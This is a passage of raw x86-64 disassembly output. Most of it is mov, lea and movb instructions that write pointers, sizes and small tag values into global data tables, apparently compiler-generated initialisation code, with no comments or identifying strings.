  40ba91:	48 8d 05 a8 f2 00 00 	lea    0xf2a8(%rip),%rax        # 0x41ad40
  40ba98:	48 89 05 69 f9 00 00 	mov    %rax,0xf969(%rip)        # 0x41b408
  40ba9f:	48 8d 05 ca f2 00 00 	lea    0xf2ca(%rip),%rax        # 0x41ad70
  40baa6:	48 89 05 ab 47 01 00 	mov    %rax,0x147ab(%rip)        # 0x420258
  40baad:	48 8d 05 ec f2 00 00 	lea    0xf2ec(%rip),%rax        # 0x41ada0
  40bab4:	48 89 05 fd f1 00 00 	mov    %rax,0xf1fd(%rip)        # 0x41acb8
  40babb:	48 8d 05 de f1 00 00 	lea    0xf1de(%rip),%rax        # 0x41aca0
  40bac2:	48 89 05 47 3e 01 00 	mov    %rax,0x13e47(%rip)        # 0x41f910
  40bac9:	48 8b 05 90 b9 00 00 	mov    0xb990(%rip),%rax        # 0x417460
  40bad0:	48 8d 35 90 37 00 00 	lea    0x3790(%rip),%rsi        # 0x40f267
  40bad7:	c6 05 6a 3e 01 00 1a 	movb   $0x1a,0x13e6a(%rip)        # 0x41f948
  40bade:	48 8d 0d 95 37 00 00 	lea    0x3795(%rip),%rcx        # 0x40f27a
  40bae5:	48 c7 05 10 3d 01 00 	movq   $0x10,0x13d10(%rip)        # 0x41f800
  40baec:	10 00 00 00 
  40baf0:	4c 8d 35 09 3e 01 00 	lea    0x13e09(%rip),%r14        # 0x41f900
  40baf7:	c6 05 4b 3e 01 00 03 	movb   $0x3,0x13e4b(%rip)        # 0x41f949
  40bafe:	4c 8d 2d 7b 43 01 00 	lea    0x1437b(%rip),%r13        # 0x41fe80
  40bb05:	c6 05 04 f2 00 00 01 	movb   $0x1,0xf204(%rip)        # 0x41ad10
  40bb0c:	48 8d 15 4d f1 00 00 	lea    0xf14d(%rip),%rdx        # 0x41ac60
  40bb13:	48 c7 05 f2 3c 01 00 	movq   $0x0,0x13cf2(%rip)        # 0x41f810
  40bb1a:	00 00 00 00 
  40bb1e:	4c 8d 15 fb e7 00 00 	lea    0xe7fb(%rip),%r10        # 0x41a320
  40bb25:	4c 89 3d f4 f1 00 00 	mov    %r15,0xf1f4(%rip)        # 0x41ad20
  40bb2c:	4c 8d 05 2d f6 00 00 	lea    0xf62d(%rip),%r8        # 0x41b160
  40bb33:	48 89 3d ee f1 00 00 	mov    %rdi,0xf1ee(%rip)        # 0x41ad28
  40bb3a:	4c 8d 25 7b 37 00 00 	lea    0x377b(%rip),%r12        # 0x40f2bc
  40bb41:	48 c7 05 f4 3d 01 00 	movq   $0x8,0x13df4(%rip)        # 0x41f940
  40bb48:	08 00 00 00 
  40bb4c:	48 c7 05 f9 3d 01 00 	movq   $0x0,0x13df9(%rip)        # 0x41f950
  40bb53:	00 00 00 00 
  40bb57:	48 c7 05 b6 f1 00 00 	movq   $0x0,0xf1b6(%rip)        # 0x41ad18
  40bb5e:	00 00 00 00 
  40bb62:	48 c7 05 d3 46 01 00 	movq   $0x8,0x146d3(%rip)        # 0x420240
  40bb69:	08 00 00 00 
  40bb6d:	c6 05 d4 46 01 00 11 	movb   $0x11,0x146d4(%rip)        # 0x420248
  40bb74:	48 c7 05 d1 46 01 00 	movq   $0x0,0x146d1(%rip)        # 0x420250
  40bb7b:	00 00 00 00 
  40bb7f:	c6 05 c3 46 01 00 01 	movb   $0x1,0x146c3(%rip)        # 0x420249
  40bb86:	48 c7 05 ff f1 00 00 	movq   $0x0,0xf1ff(%rip)        # 0x41ad90
  40bb8d:	00 00 00 00 
  40bb91:	c6 05 d8 f1 00 00 02 	movb   $0x2,0xf1d8(%rip)        # 0x41ad70
  40bb98:	48 c7 05 fd f0 00 00 	movq   $0x8,0xf0fd(%rip)        # 0x41aca0
  40bb9f:	08 00 00 00 
  40bba3:	c6 05 fe f0 00 00 11 	movb   $0x11,0xf0fe(%rip)        # 0x41aca8
  40bbaa:	48 89 2d ff f0 00 00 	mov    %rbp,0xf0ff(%rip)        # 0x41acb0
  40bbb1:	c6 05 f1 f0 00 00 01 	movb   $0x1,0xf0f1(%rip)        # 0x41aca9
  40bbb8:	48 c7 05 fd f1 00 00 	movq   $0x0,0xf1fd(%rip)        # 0x41adc0
  40bbbf:	00 00 00 00 
  40bbc3:	c6 05 d6 f1 00 00 02 	movb   $0x2,0xf1d6(%rip)        # 0x41ada0
  40bbca:	48 c7 05 2b 3d 01 00 	movq   $0x8,0x13d2b(%rip)        # 0x41f900
  40bbd1:	08 00 00 00 
  40bbd5:	c6 05 2c 3d 01 00 16 	movb   $0x16,0x13d2c(%rip)        # 0x41f908
  40bbdc:	48 89 05 45 3d 01 00 	mov    %rax,0x13d45(%rip)        # 0x41f928
  40bbe3:	48 8d 05 16 f8 00 00 	lea    0xf816(%rip),%rax        # 0x41b400
  40bbea:	48 89 05 17 f1 00 00 	mov    %rax,0xf117(%rip)        # 0x41ad08
  40bbf1:	48 8d 05 e8 f0 00 00 	lea    0xf0e8(%rip),%rax        # 0x41ace0
  40bbf8:	48 89 05 19 3c 01 00 	mov    %rax,0x13c19(%rip)        # 0x41f818
  40bbff:	48 8d 05 fa 3b 01 00 	lea    0x13bfa(%rip),%rax        # 0x41f800
  40bc06:	48 89 05 63 39 01 00 	mov    %rax,0x13963(%rip)        # 0x41f570
  40bc0d:	48 8b 05 fc b8 00 00 	mov    0xb8fc(%rip),%rax        # 0x417510
  40bc14:	48 89 1d 2d f2 00 00 	mov    %rbx,0xf22d(%rip)        # 0x41ae48
  40bc1b:	48 8d 1d 3e f2 00 00 	lea    0xf23e(%rip),%rbx        # 0x41ae60
  40bc22:	48 89 1d 07 f0 00 00 	mov    %rbx,0xf007(%rip)        # 0x41ac30
  40bc29:	48 8b 1d 50 b9 00 00 	mov    0xb950(%rip),%rbx        # 0x417580
  40bc30:	c6 05 09 f1 00 00 01 	movb   $0x1,0xf109(%rip)        # 0x41ad40
  40bc37:	48 89 05 4a 39 01 00 	mov    %rax,0x1394a(%rip)        # 0x41f588
  40bc3e:	48 8d 05 bb f1 00 00 	lea    0xf1bb(%rip),%rax        # 0x41ae00
  40bc45:	48 89 05 d4 ef 00 00 	mov    %rax,0xefd4(%rip)        # 0x41ac20
  40bc4c:	48 8d 05 ed 3a 01 00 	lea    0x13aed(%rip),%rax        # 0x41f740
  40bc53:	48 89 05 b6 f1 00 00 	mov    %rax,0xf1b6(%rip)        # 0x41ae10
  40bc5a:	48 8d 05 0d 36 00 00 	lea    0x360d(%rip),%rax        # 0x40f26e
  40bc61:	48 89 05 b0 f1 00 00 	mov    %rax,0xf1b0(%rip)        # 0x41ae18
  40bc68:	48 8d 05 c1 f1 00 00 	lea    0xf1c1(%rip),%rax        # 0x41ae30
  40bc6f:	48 89 05 b2 ef 00 00 	mov    %rax,0xefb2(%rip)        # 0x41ac28
  40bc76:	48 8d 05 63 ef 00 00 	lea    0xef63(%rip),%rax        # 0x41abe0
  40bc7d:	48 89 05 bc f1 00 00 	mov    %rax,0xf1bc(%rip)        # 0x41ae40
  40bc84:	48 c7 05 b9 f0 00 00 	movq   $0x8,0xf0b9(%rip)        # 0x41ad48
  40bc8b:	08 00 00 00 
  40bc8f:	4c 89 35 ba f0 00 00 	mov    %r14,0xf0ba(%rip)        # 0x41ad50
  40bc96:	48 89 35 bb f0 00 00 	mov    %rsi,0xf0bb(%rip)        # 0x41ad58
  40bc9d:	48 c7 05 58 f0 00 00 	movq   $0x2,0xf058(%rip)        # 0x41ad00
  40bca4:	02 00 00 00 
  40bca8:	c6 05 31 f0 00 00 02 	movb   $0x2,0xf031(%rip)        # 0x41ace0
  40bcaf:	48 c7 05 a6 38 01 00 	movq   $0x8,0x138a6(%rip)        # 0x41f560
  40bcb6:	08 00 00 00 
  40bcba:	c6 05 a7 38 01 00 18 	movb   $0x18,0x138a7(%rip)        # 0x41f568
  40bcc1:	48 c7 05 94 ef 00 00 	movq   $0x30,0xef94(%rip)        # 0x41ac60
  40bcc8:	30 00 00 00 
  40bccc:	c6 05 95 ef 00 00 11 	movb   $0x11,0xef95(%rip)        # 0x41ac68
  40bcd3:	48 89 2d 96 ef 00 00 	mov    %rbp,0xef96(%rip)        # 0x41ac70
  40bcda:	c6 05 1f f1 00 00 01 	movb   $0x1,0xf11f(%rip)        # 0x41ae00
  40bce1:	48 c7 05 1c f1 00 00 	movq   $0x8,0xf11c(%rip)        # 0x41ae08
  40bce8:	08 00 00 00 
  40bcec:	48 c7 05 e9 ee 00 00 	movq   $0x8,0xeee9(%rip)        # 0x41abe0
  40bcf3:	08 00 00 00 
  40bcf7:	c6 05 ea ee 00 00 1d 	movb   $0x1d,0xeeea(%rip)        # 0x41abe8
  40bcfe:	48 c7 05 e7 ee 00 00 	movq   $0x0,0xeee7(%rip)        # 0x41abf0
  40bd05:	00 00 00 00 
  40bd09:	c6 05 d9 ee 00 00 03 	movb   $0x3,0xeed9(%rip)        # 0x41abe9
  40bd10:	c6 05 19 f1 00 00 01 	movb   $0x1,0xf119(%rip)        # 0x41ae30
  40bd17:	48 c7 05 16 f1 00 00 	movq   $0x10,0xf116(%rip)        # 0x41ae38
  40bd1e:	10 00 00 00 
  40bd22:	48 c7 03 08 00 00 00 	movq   $0x8,(%rbx)
  40bd29:	48 89 0d 48 f1 00 00 	mov    %rcx,0xf148(%rip)        # 0x41ae78
  40bd30:	48 8d 0d 59 f1 00 00 	lea    0xf159(%rip),%rcx        # 0x41ae90
  40bd37:	48 89 0d fa ee 00 00 	mov    %rcx,0xeefa(%rip)        # 0x41ac38
  40bd3e:	48 8d 0d ab f1 00 00 	lea    0xf1ab(%rip),%rcx        # 0x41aef0
  40bd45:	48 89 0d 34 ee 00 00 	mov    %rcx,0xee34(%rip)        # 0x41ab80
  40bd4c:	48 8d 0d 2b 35 00 00 	lea    0x352b(%rip),%rcx        # 0x40f27e
  40bd53:	48 89 0d ae f1 00 00 	mov    %rcx,0xf1ae(%rip)        # 0x41af08
  40bd5a:	48 8d 0d bf f1 00 00 	lea    0xf1bf(%rip),%rcx        # 0x41af20
  40bd61:	48 89 05 98 f1 00 00 	mov    %rax,0xf198(%rip)        # 0x41af00
  40bd68:	48 89 0d 19 ee 00 00 	mov    %rcx,0xee19(%rip)        # 0x41ab88
  40bd6f:	48 8d 0d 11 35 00 00 	lea    0x3511(%rip),%rcx        # 0x40f287
  40bd76:	48 89 05 e3 f1 00 00 	mov    %rax,0xf1e3(%rip)        # 0x41af60
  40bd7d:	48 8d 05 08 35 00 00 	lea    0x3508(%rip),%rax        # 0x40f28c
  40bd84:	48 89 0d ad f1 00 00 	mov    %rcx,0xf1ad(%rip)        # 0x41af38
  40bd8b:	48 8d 0d be f1 00 00 	lea    0xf1be(%rip),%rcx        # 0x41af50
  40bd92:	48 89 05 cf f1 00 00 	mov    %rax,0xf1cf(%rip)        # 0x41af68
  40bd99:	48 8d 05 e0 ed 00 00 	lea    0xede0(%rip),%rax        # 0x41ab80
  40bda0:	48 89 0d e9 ed 00 00 	mov    %rcx,0xede9(%rip)        # 0x41ab90
  40bda7:	48 8d 0d 02 f2 00 00 	lea    0xf202(%rip),%rcx        # 0x41afb0
  40bdae:	c6 43 08 1c          	movb   $0x1c,0x8(%rbx)
  40bdb2:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
  40bdb9:	00 
  40bdba:	c6 43 09 02          	movb   $0x2,0x9(%rbx)
  40bdbe:	c6 05 9b f0 00 00 01 	movb   $0x1,0xf09b(%rip)        # 0x41ae60
  40bdc5:	48 c7 05 98 f0 00 00 	movq   $0x18,0xf098(%rip)        # 0x41ae68
  40bdcc:	18 00 00 00 
  40bdd0:	48 89 1d 99 f0 00 00 	mov    %rbx,0xf099(%rip)        # 0x41ae70
  40bdd7:	48 c7 05 be ed 00 00 	movq   $0x18,0xedbe(%rip)        # 0x41aba0
  40bdde:	18 00 00 00 
  40bde2:	c6 05 bf ed 00 00 12 	movb   $0x12,0xedbf(%rip)        # 0x41aba8
  40bde9:	48 c7 05 bc ed 00 00 	movq   $0x0,0xedbc(%rip)        # 0x41abb0
  40bdf0:	00 00 00 00 
  40bdf4:	c6 05 ae ed 00 00 03 	movb   $0x3,0xedae(%rip)        # 0x41aba9
  40bdfb:	c6 05 ee f0 00 00 01 	movb   $0x1,0xf0ee(%rip)        # 0x41aef0
  40be02:	48 c7 05 eb f0 00 00 	movq   $0x0,0xf0eb(%rip)        # 0x41aef8
  40be09:	00 00 00 00 
  40be0d:	48 c7 05 68 40 01 00 	movq   $0x8,0x14068(%rip)        # 0x41fe80
  40be14:	08 00 00 00 
  40be18:	c6 05 69 40 01 00 1f 	movb   $0x1f,0x14069(%rip)        # 0x41fe88
  40be1f:	48 c7 05 66 40 01 00 	movq   $0x0,0x14066(%rip)        # 0x41fe90
  40be26:	00 00 00 00 
  40be2a:	c6 05 58 40 01 00 03 	movb   $0x3,0x14058(%rip)        # 0x41fe89
  40be31:	c6 05 e8 f0 00 00 01 	movb   $0x1,0xf0e8(%rip)        # 0x41af20
  40be38:	48 c7 05 e5 f0 00 00 	movq   $0x8,0xf0e5(%rip)        # 0x41af28
  40be3f:	08 00 00 00 
  40be43:	4c 89 2d e6 f0 00 00 	mov    %r13,0xf0e6(%rip)        # 0x41af30
  40be4a:	c6 05 ff f0 00 00 01 	movb   $0x1,0xf0ff(%rip)        # 0x41af50
  40be51:	48 c7 05 fc f0 00 00 	movq   $0x10,0xf0fc(%rip)        # 0x41af58
  40be58:	10 00 00 00 
  40be5c:	48 c7 05 79 f0 00 00 	movq   $0x3,0xf079(%rip)        # 0x41aee0
  40be63:	03 00 00 00 
  40be67:	c6 05 52 f0 00 00 02 	movb   $0x2,0xf052(%rip)        # 0x41aec0
  40be6e:	48 89 05 73 f0 00 00 	mov    %rax,0xf073(%rip)        # 0x41aee8
  40be75:	48 8d 05 44 f0 00 00 	lea    0xf044(%rip),%rax        # 0x41aec0
  40be7c:	48 89 05 35 ed 00 00 	mov    %rax,0xed35(%rip)        # 0x41abb8
  40be83:	48 8d 05 16 ed 00 00 	lea    0xed16(%rip),%rax        # 0x41aba0
  40be8a:	48 89 05 1f e7 00 00 	mov    %rax,0xe71f(%rip)        # 0x41a5b0
  40be91:	48 8b 05 a8 b6 00 00 	mov    0xb6a8(%rip),%rax        # 0x417540
  40be98:	48 89 0d b9 ec 00 00 	mov    %rcx,0xecb9(%rip)        # 0x41ab58
  40be9f:	48 8d 0d 3a f1 00 00 	lea    0xf13a(%rip),%rcx        # 0x41afe0
  40bea6:	48 89 15 a3 38 01 00 	mov    %rdx,0x138a3(%rip)        # 0x41f750
  40bead:	48 89 15 9c ec 00 00 	mov    %rdx,0xec9c(%rip)        # 0x41ab50
  40beb4:	48 89 05 0d e7 00 00 	mov    %rax,0xe70d(%rip)        # 0x41a5c8
  40bebb:	48 8d 05 de e6 00 00 	lea    0xe6de(%rip),%rax        # 0x41a5a0
  40bec2:	48 89 05 d7 ef 00 00 	mov    %rax,0xefd7(%rip)        # 0x41aea0
  40bec9:	48 8d 05 c5 33 00 00 	lea    0x33c5(%rip),%rax        # 0x40f295
  40bed0:	48 89 05 d1 ef 00 00 	mov    %rax,0xefd1(%rip)        # 0x41aea8
  40bed7:	48 8d 05 a2 f0 00 00 	lea    0xf0a2(%rip),%rax        # 0x41af80
  40bede:	48 89 05 5b ed 00 00 	mov    %rax,0xed5b(%rip)        # 0x41ac40
  40bee5:	48 8d 05 54 38 01 00 	lea    0x13854(%rip),%rax        # 0x41f740
  40beec:	48 89 05 9d f0 00 00 	mov    %rax,0xf09d(%rip)        # 0x41af90
  40bef3:	48 8d 05 a1 33 00 00 	lea    0x33a1(%rip),%rax        # 0x40f29b
  40befa:	48 89 05 97 f0 00 00 	mov    %rax,0xf097(%rip)        # 0x41af98
  40bf01:	48 8d 05 18 ed 00 00 	lea    0xed18(%rip),%rax        # 0x41ac20
  40bf08:	48 89 05 e9 ee 00 00 	mov    %rax,0xeee9(%rip)        # 0x41adf8
  40bf0f:	48 8d 05 ba ee 00 00 	lea    0xeeba(%rip),%rax        # 0x41add0
  40bf16:	48 89 05 5b ed 00 00 	mov    %rax,0xed5b(%rip)        # 0x41ac78
  40bf1d:	48 8b 05 ac b5 00 00 	mov    0xb5ac(%rip),%rax        # 0x4174d0
  40bf24:	48 c7 05 71 e6 00 00 	movq   $0x8,0xe671(%rip)        # 0x41a5a0
  40bf2b:	08 00 00 00 
  40bf2f:	c6 05 72 e6 00 00 18 	movb   $0x18,0xe672(%rip)        # 0x41a5a8
  40bf36:	c6 05 6c e6 00 00 02 	movb   $0x2,0xe66c(%rip)        # 0x41a5a9
  40bf3d:	48 89 05 24 38 01 00 	mov    %rax,0x13824(%rip)        # 0x41f768
  40bf44:	48 8d 05 f5 eb 00 00 	lea    0xebf5(%rip),%rax        # 0x41ab40
  40bf4b:	c6 05 3e ef 00 00 01 	movb   $0x1,0xef3e(%rip)        # 0x41ae90
  40bf52:	48 c7 05 3b ef 00 00 	movq   $0x20,0xef3b(%rip)        # 0x41ae98
  40bf59:	20 00 00 00 
  40bf5d:	c6 05 1c f0 00 00 01 	movb   $0x1,0xf01c(%rip)        # 0x41af80
  40bf64:	48 c7 05 19 f0 00 00 	movq   $0x28,0xf019(%rip)        # 0x41af88
  40bf6b:	28 00 00 00 
  40bf6f:	48 c7 05 76 ee 00 00 	movq   $0x5,0xee76(%rip)        # 0x41adf0
  40bf76:	05 00 00 00 
  40bf7a:	c6 05 4f ee 00 00 02 	movb   $0x2,0xee4f(%rip)        # 0x41add0
  40bf81:	48 c7 05 b4 37 01 00 	movq   $0x8,0x137b4(%rip)        # 0x41f740
  40bf88:	08 00 00 00 
  40bf8c:	c6 05 b5 37 01 00 16 	movb   $0x16,0x137b5(%rip)        # 0x41f748
  40bf93:	48 c7 05 a2 eb 00 00 	movq   $0x30,0xeba2(%rip)        # 0x41ab40
  40bf9a:	30 00 00 00 
  40bf9e:	c6 05 a3 eb 00 00 11 	movb   $0x11,0xeba3(%rip)        # 0x41ab48
  40bfa5:	48 c7 05 20 f0 00 00 	movq   $0x0,0xf020(%rip)        # 0x41afd0
  40bfac:	00 00 00 00 
  40bfb0:	c6 05 f9 ef 00 00 02 	movb   $0x2,0xeff9(%rip)        # 0x41afb0
  40bfb7:	48 c7 05 9e e5 00 00 	movq   $0x30,0xe59e(%rip)        # 0x41a560
  40bfbe:	30 00 00 00 
  40bfc2:	48 89 0d af e5 00 00 	mov    %rcx,0xe5af(%rip)        # 0x41a578
  40bfc9:	48 8d 0d 90 e5 00 00 	lea    0xe590(%rip),%rcx        # 0x41a560
  40bfd0:	48 89 0d 59 e5 00 00 	mov    %rcx,0xe559(%rip)        # 0x41a530
  40bfd7:	48 8b 0d 62 b4 00 00 	mov    0xb462(%rip),%rcx        # 0x417440
  40bfde:	48 89 15 eb ea 00 00 	mov    %rdx,0xeaeb(%rip)        # 0x41aad0
  40bfe5:	48 8d 15 84 f0 00 00 	lea    0xf084(%rip),%rdx        # 0x41b070
  40bfec:	48 89 05 7d e5 00 00 	mov    %rax,0xe57d(%rip)        # 0x41a570
  40bff3:	48 89 05 16 eb 00 00 	mov    %rax,0xeb16(%rip)        # 0x41ab10
  40bffa:	48 89 0d 47 e5 00 00 	mov    %rcx,0xe547(%rip)        # 0x41a548
  40c001:	48 8d 0d 08 f0 00 00 	lea    0xf008(%rip),%rcx        # 0x41b010
  40c008:	48 89 0d 09 eb 00 00 	mov    %rcx,0xeb09(%rip)        # 0x41ab18
  40c00f:	48 8d 0d ea ea 00 00 	lea    0xeaea(%rip),%rcx        # 0x41ab00
  40c016:	48 89 0d d3 e4 00 00 	mov    %rcx,0xe4d3(%rip)        # 0x41a4f0
  40c01d:	48 8d 0d 1c f0 00 00 	lea    0xf01c(%rip),%rcx        # 0x41b040
  40c024:	48 89 0d cd e4 00 00 	mov    %rcx,0xe4cd(%rip)        # 0x41a4f8
  40c02b:	48 8d 0d ae e4 00 00 	lea    0xe4ae(%rip),%rcx        # 0x41a4e0
  40c032:	48 89 0d 77 e4 00 00 	mov    %rcx,0xe477(%rip)        # 0x41a4b0
  40c039:	48 8b 0d 50 b4 00 00 	mov    0xb450(%rip),%rcx        # 0x417490
  40c040:	c6 05 21 e5 00 00 11 	movb   $0x11,0xe521(%rip)        # 0x41a568
  40c047:	48 c7 05 ae ef 00 00 	movq   $0x0,0xefae(%rip)        # 0x41b000
  40c04e:	00 00 00 00 
  40c052:	c6 05 87 ef 00 00 02 	movb   $0x2,0xef87(%rip)        # 0x41afe0
  40c059:	48 89 0d 68 e4 00 00 	mov    %rcx,0xe468(%rip)        # 0x41a4c8
  40c060:	48 8d 0d 59 ea 00 00 	lea    0xea59(%rip),%rcx        # 0x41aac0
  40c067:	48 c7 05 ae e4 00 00 	movq   $0x8,0xe4ae(%rip)        # 0x41a520
  40c06e:	08 00 00 00 
  40c072:	c6 05 af e4 00 00 16 	movb   $0x16,0xe4af(%rip)        # 0x41a528
  40c079:	48 c7 05 7c ea 00 00 	movq   $0x30,0xea7c(%rip)        # 0x41ab00
  40c080:	30 00 00 00 
  40c084:	c6 05 7d ea 00 00 11 	movb   $0x11,0xea7d(%rip)        # 0x41ab08
  40c08b:	48 c7 05 9a ef 00 00 	movq   $0x0,0xef9a(%rip)        # 0x41b030
  40c092:	00 00 00 00 
  40c096:	c6 05 73 ef 00 00 02 	movb   $0x2,0xef73(%rip)        # 0x41b010
  40c09d:	48 c7 05 38 e4 00 00 	movq   $0x30,0xe438(%rip)        # 0x41a4e0
  40c0a4:	30 00 00 00 
  40c0a8:	c6 05 39 e4 00 00 11 	movb   $0x11,0xe439(%rip)        # 0x41a4e8
  40c0af:	48 c7 05 a6 ef 00 00 	movq   $0x0,0xefa6(%rip)        # 0x41b060
  40c0b6:	00 00 00 00 
  40c0ba:	c6 05 7f ef 00 00 02 	movb   $0x2,0xef7f(%rip)        # 0x41b040
  40c0c1:	48 c7 05 d4 e3 00 00 	movq   $0x8,0xe3d4(%rip)        # 0x41a4a0
  40c0c8:	08 00 00 00 
  40c0cc:	c6 05 d5 e3 00 00 16 	movb   $0x16,0xe3d5(%rip)        # 0x41a4a8
  40c0d3:	48 c7 05 e2 e9 00 00 	movq   $0x30,0xe9e2(%rip)        # 0x41aac0
  40c0da:	30 00 00 00 
  40c0de:	c6 05 e3 e9 00 00 11 	movb   $0x11,0xe9e3(%rip)        # 0x41aac8
  40c0e5:	48 c7 05 a0 ef 00 00 	movq   $0x0,0xefa0(%rip)        # 0x41b090
  40c0ec:	00 00 00 00 
  40c0f0:	c6 05 79 ef 00 00 02 	movb   $0x2,0xef79(%rip)        # 0x41b070
  40c0f7:	48 89 15 da e9 00 00 	mov    %rdx,0xe9da(%rip)        # 0x41aad8
  40c0fe:	48 8d 15 7b e9 00 00 	lea    0xe97b(%rip),%rdx        # 0x41aa80
  40c105:	48 89 15 a4 ef 00 00 	mov    %rdx,0xefa4(%rip)        # 0x41b0b0
  40c10c:	48 8d 15 8b 31 00 00 	lea    0x318b(%rip),%rdx        # 0x40f29e
  40c113:	48 89 15 9e ef 00 00 	mov    %rdx,0xef9e(%rip)        # 0x41b0b8
  40c11a:	48 8d 15 7f ef 00 00 	lea    0xef7f(%rip),%rdx        # 0x41b0a0
  40c121:	48 89 15 50 e3 00 00 	mov    %rdx,0xe350(%rip)        # 0x41a478
  40c128:	48 8d 15 31 e3 00 00 	lea    0xe331(%rip),%rdx        # 0x41a460
  40c12f:	48 89 15 fa e2 00 00 	mov    %rdx,0xe2fa(%rip)        # 0x41a430
  40c136:	48 8b 15 e3 b2 00 00 	mov    0xb2e3(%rip),%rdx        # 0x417420
  40c13d:	48 89 0d 2c e3 00 00 	mov    %rcx,0xe32c(%rip)        # 0x41a470
  40c144:	48 c7 05 11 e3 00 00 	movq   $0x38,0xe311(%rip)        # 0x41a460
  40c14b:	38 00 00 00 
  40c14f:	c6 05 12 e3 00 00 11 	movb   $0x11,0xe312(%rip)        # 0x41a468
  40c156:	48 89 15 eb e2 00 00 	mov    %rdx,0xe2eb(%rip)        # 0x41a448
  40c15d:	48 8d 15 9c e8 00 00 	lea    0xe89c(%rip),%rdx        # 0x41aa00
  40c164:	48 c7 05 11 e9 00 00 	movq   $0x4,0xe911(%rip)        # 0x41aa80
  40c16b:	04 00 00 00 
  40c16f:	c6 05 12 e9 00 00 22 	movb   $0x22,0xe912(%rip)        # 0x41aa88
  40c176:	48 c7 05 0f e9 00 00 	movq   $0x0,0xe90f(%rip)        # 0x41aa90
  40c17d:	00 00 00 00 
  40c181:	c6 05 01 e9 00 00 03 	movb   $0x3,0xe901(%rip)        # 0x41aa89
  40c188:	c6 05 11 ef 00 00 01 	movb   $0x1,0xef11(%rip)        # 0x41b0a0
  40c18f:	48 c7 05 0e ef 00 00 	movq   $0x30,0xef0e(%rip)        # 0x41b0a8
  40c196:	30 00 00 00 
  40c19a:	48 c7 05 7b e2 00 00 	movq   $0x8,0xe27b(%rip)        # 0x41a420
  40c1a1:	08 00 00 00 
  40c1a5:	c6 05 7c e2 00 00 16 	movb   $0x16,0xe27c(%rip)        # 0x41a428
  40c1ac:	48 c7 05 29 3a 01 00 	movq   $0x8,0x13a29(%rip)        # 0x41fbe0
  40c1b3:	08 00 00 00 
  40c1b7:	c6 05 2a 3a 01 00 23 	movb   $0x23,0x13a2a(%rip)        # 0x41fbe8
  40c1be:	48 c7 05 27 3a 01 00 	movq   $0x0,0x13a27(%rip)        # 0x41fbf0
  40c1c5:	00 00 00 00 
  40c1c9:	c6 05 19 3a 01 00 03 	movb   $0x3,0x13a19(%rip)        # 0x41fbe9
  40c1d0:	48 c7 05 a5 35 01 00 	movq   $0x1,0x135a5(%rip)        # 0x41f780
  40c1d7:	01 00 00 00 
  40c1db:	c6 05 a6 35 01 00 01 	movb   $0x1,0x135a6(%rip)        # 0x41f788
  40c1e2:	48 c7 05 a3 35 01 00 	movq   $0x0,0x135a3(%rip)        # 0x41f790
  40c1e9:	00 00 00 00 
  40c1ed:	c6 05 95 35 01 00 03 	movb   $0x3,0x13595(%rip)        # 0x41f789
  40c1f4:	48 c7 05 41 e8 00 00 	movq   $0x2,0xe841(%rip)        # 0x41aa40
  40c1fb:	02 00 00 00 
  40c1ff:	c6 05 42 e8 00 00 21 	movb   $0x21,0xe842(%rip)        # 0x41aa48
  40c206:	48 c7 05 3f e8 00 00 	movq   $0x0,0xe83f(%rip)        # 0x41aa50
  40c20d:	00 00 00 00 
  40c211:	c6 05 31 e8 00 00 03 	movb   $0x3,0xe831(%rip)        # 0x41aa49
  40c218:	48 c7 05 dd e7 00 00 	movq   $0x1,0xe7dd(%rip)        # 0x41aa00
  40c21f:	01 00 00 00 
  40c223:	c6 05 de e7 00 00 29 	movb   $0x29,0xe7de(%rip)        # 0x41aa08
  40c22a:	48 c7 05 db e7 00 00 	movq   $0x0,0xe7db(%rip)        # 0x41aa10
  40c231:	00 00 00 00 
  40c235:	c6 05 cd e7 00 00 03 	movb   $0x3,0xe7cd(%rip)        # 0x41aa09
  40c23c:	48 89 15 ad e1 00 00 	mov    %rdx,0xe1ad(%rip)        # 0x41a3f0
  40c243:	48 8b 15 96 b2 00 00 	mov    0xb296(%rip),%rdx        # 0x4174e0
  40c24a:	48 89 0d 5f e1 00 00 	mov    %rcx,0xe15f(%rip)        # 0x41a3b0
  40c251:	48 89 0d d8 e0 00 00 	mov    %rcx,0xe0d8(%rip)        # 0x41a330
  40c258:	4c 89 15 91 e0 00 00 	mov    %r10,0xe091(%rip)        # 0x41a2f0
  40c25f:	48 89 15 a2 e1 00 00 	mov    %rdx,0xe1a2(%rip)        # 0x41a408
  40c266:	48 8d 15 63 ee 00 00 	lea    0xee63(%rip),%rdx        # 0x41b0d0
  40c26d:	48 89 15 44 e1 00 00 	mov    %rdx,0xe144(%rip)        # 0x41a3b8
  40c274:	48 8d 15 25 e1 00 00 	lea    0xe125(%rip),%rdx        # 0x41a3a0
  40c27b:	48 89 15 ee e0 00 00 	mov    %rdx,0xe0ee(%rip)        # 0x41a370
  40c282:	48 8b 15 f7 b1 00 00 	mov    0xb1f7(%rip),%rdx        # 0x417480
  40c289:	48 c7 05 4c e1 00 00 	movq   $0x8,0xe14c(%rip)        # 0x41a3e0
  40c290:	08 00 00 00 
  40c294:	c6 05 4d e1 00 00 18 	movb   $0x18,0xe14d(%rip)        # 0x41a3e8
  40c29b:	c6 05 47 e1 00 00 02 	movb   $0x2,0xe147(%rip)        # 0x41a3e9
  40c2a2:	48 89 15 df e0 00 00 	mov    %rdx,0xe0df(%rip)        # 0x41a388
  40c2a9:	48 8d 15 50 ee 00 00 	lea    0xee50(%rip),%rdx        # 0x41b100
  40c2b0:	48 89 15 81 e0 00 00 	mov    %rdx,0xe081(%rip)        # 0x41a338
  40c2b7:	48 8d 15 72 ee 00 00 	lea    0xee72(%rip),%rdx        # 0x41b130
  40c2be:	48 89 15 33 e0 00 00 	mov    %rdx,0xe033(%rip)        # 0x41a2f8
  40c2c5:	48 8d 15 14 e0 00 00 	lea    0xe014(%rip),%rdx        # 0x41a2e0
  40c2cc:	48 c7 05 c9 e0 00 00 	movq   $0x30,0xe0c9(%rip)        # 0x41a3a0
  40c2d3:	30 00 00 00 
  40c2d7:	c6 05 ca e0 00 00 11 	movb   $0x11,0xe0ca(%rip)        # 0x41a3a8
  40c2de:	48 c7 05 07 ee 00 00 	movq   $0x0,0xee07(%rip)        # 0x41b0f0
  40c2e5:	00 00 00 00 
  40c2e9:	c6 05 e0 ed 00 00 02 	movb   $0x2,0xede0(%rip)        # 0x41b0d0
  40c2f0:	48 c7 05 65 e0 00 00 	movq   $0x8,0xe065(%rip)        # 0x41a360
  40c2f7:	08 00 00 00 
